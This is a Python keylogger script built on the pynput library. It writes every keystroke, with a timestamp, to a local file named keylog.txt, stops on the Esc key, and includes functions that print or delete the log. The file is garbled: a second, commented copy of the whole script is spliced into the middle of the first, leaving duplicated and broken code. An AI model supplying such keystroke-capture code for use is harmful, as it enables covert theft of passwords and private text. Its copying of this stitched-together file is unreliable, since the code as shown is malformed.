from pynput import keyboard
import logging
import os
from datetime import datetime

# Set up logging to save keystrokes to a file
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to log keystrokes
def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special key pressed: {key}')

# Function to stop logging when Esc key is pressed
def on_release(key):
    if key == keyboard.Key.esc:
        logging.info("Logging stopped.")
        return False

# Function to start the keyloggerfrom pynput import keyboard
import logging
import os
from datetime import datetime

# Set up logging to save keystrokes to a file
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to log keystrokes
def on_press(key):
    """Logs each key press event."""
    try:
        logging.info(f'Key pressed: {key.char}')  # Logs normal character keys
    except AttributeError:
        logging.info(f'Special key pressed: {key}')  # Logs special keys (e.g., Shift, Ctrl, etc.)

# Function to stop logging when Esc key is pressed
def on_release(key):
    """Stops the keylogger when the Escape key is pressed."""
    if key == keyboard.Key.esc:
        logging.info("Logging stopped.")
        return False  # Stops the listener

# Function to start the keylogger
def start_keylogger():
    """Starts the keylogger and listens for key events."""
    logging.info("Keylogger started.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()  # Keeps the listener running

# Function to read and display log file content
def read_logs():
    """Reads and prints the contents of the keylog file."""
    if os.path.exists(log_file):
        with open(log_file, "r") as file:
            print("--- Keylogger Logs ---")
            print(file.read())  # Display the logged keystrokes
    else:
        print("No logs found.")

# Function to clear logs
def clear_logs():
    """Deletes the keylog file to clear recorded keystrokes."""
    if os.path.exists(log_file):
        os.remove(log_file)
        print("Logs cleared.")
    else:
        print("No logs to clear.")

if __name__ == "__main__":
    print("Keylogger is running... Press Esc to stop.")
    start_keylogger()  # Start logging keystrokes
def start_keylogger():
    logging.info("Keylogger started.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Function to read and display log file content
def read_logs():
    if os.path.exists(log_file):
        with open(log_file, "r") as file:
            print("--- Keylogger Logs ---")
            print(file.read())
    else:
        print("No logs found.")

# Function to clear logs
def clear_logs():
    if os.path.exists(log_file):
        os.remove(log_file)
        print("Logs cleared.")
    else:
        print("No logs to clear.")

if __name__ == "__main__":
    print("Keylogger is running... Press Esc to stop.")
    start_keylogger()

